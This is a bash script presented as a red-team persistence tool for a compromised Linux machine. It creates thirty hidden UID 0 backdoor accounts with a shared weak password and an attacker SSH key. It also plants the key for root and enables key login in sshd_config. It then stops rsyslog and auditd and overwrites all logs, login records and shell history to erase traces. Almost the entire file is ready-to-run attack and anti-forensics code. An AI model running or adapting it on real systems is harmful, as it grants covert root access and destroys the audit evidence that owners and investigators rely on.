#!/bin/bash

# ðŸš€ Red Team Persistence Script - Automates UID 0 Users, SSH Persistence & Full Log Wipe

# List of fake users (All UID 0 for persistence)
USERS=("mattdamon" "peter" "parker" "yourmom" "gandalf" "tonystark" "batman" "spiderman" "joker" "loki"
       "frodo" "sauron" "thanos" "deadpool" "drstrange" "neo" "trinity" "morpheus" "johnwick" "yoda"
       "vader" "obiwan" "skywalker" "terminator" "ragnar" "ezio" "altair" "kratos" "agent47" "geralt")

# Replace with the actual SSH public key from Kali
PUBKEY="ssh-rsa AAAAB3...your_public_key_here"

echo "[*] Setting up persistence on this target machine..."

# Create each fake UID 0 user & add SSH persistence
for USER in "${USERS[@]}"; do
    if id "$USER" &>/dev/null; then
        echo "[!] User $USER already exists, skipping..."
    else
        useradd -ou 0 -g 0 "$USER"
        echo "$USER:Password123" | chpasswd
        mkdir -p /home/$USER/.ssh
        echo "$PUBKEY" >> /home/$USER/.ssh/authorized_keys
        chmod 700 /home/$USER/.ssh
        chmod 600 /home/$USER/.ssh/authorized_keys
        chown -R $USER:$USER /home/$USER/.ssh
        echo "[+] Created UID 0 user: $USER and added SSH key"
    fi
done

# Ensure root SSH access remains intact
mkdir -p /root/.ssh
echo "$PUBKEY" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
echo "[+] Ensured root has persistent SSH access"

# Modify sshd_config to enable PubkeyAuthentication
SSHD_CONFIG="/etc/ssh/sshd_config"

# Uncomment 'PubkeyAuthentication yes' if it's commented out
sed -i 's/^#PubkeyAuthentication yes/PubkeyAuthentication yes/' "$SSHD_CONFIG"
# Ensure the line exists if it was missing
grep -q "^PubkeyAuthentication yes" "$SSHD_CONFIG" || echo "PubkeyAuthentication yes" >> "$SSHD_CONFIG"

# Uncomment 'AuthorizedKeysFile' if it's commented out
sed -i 's/^#AuthorizedKeysFile/AuthorizedKeysFile/' "$SSHD_CONFIG"
# Ensure it's correctly set
grep -q "^AuthorizedKeysFile .ssh/authorized_keys" "$SSHD_CONFIG" || echo "AuthorizedKeysFile .ssh/authorized_keys" >> "$SSHD_CONFIG"

echo "[+] SSH Key Authentication enabled in sshd_config"

# Restart SSH service to apply changes
systemctl restart sshd
echo "[âœ”] SSH service restarted. Persistence should now be active."

# STOP system logging before clearing logs
echo "[*] Stopping logging services..."
systemctl stop rsyslog
systemctl stop auditd

# Overwrite and clear all logs with "hi there buddy!"
echo "[*] Overwriting authentication and system logs..."
find /var/log -type f -exec sh -c 'echo "hi there buddy!" > {}' \;

# Specific logs for authentication, login history, and command history
echo "hi there buddy!" > /var/log/auth.log
echo "hi there buddy!" > /var/log/secure
echo "hi there buddy!" > /var/log/syslog
echo "hi there buddy!" > /var/log/messages
echo "hi there buddy!" > /var/log/audit/audit.log
echo "hi there buddy!" > /var/run/utmp
echo "hi there buddy!" > /var/log/wtmp
echo "hi there buddy!" > /var/log/btmp
echo "hi there buddy!" > /var/log/lastlog
echo "hi there buddy!" > ~/.bash_history
history -c

# Restart logging services after wiping logs
echo "[*] Restarting logging services..."
systemctl start rsyslog
systemctl start auditd

echo "[âœ”] Logs wiped and overwritten with: 'hi there buddy!'"

exit 0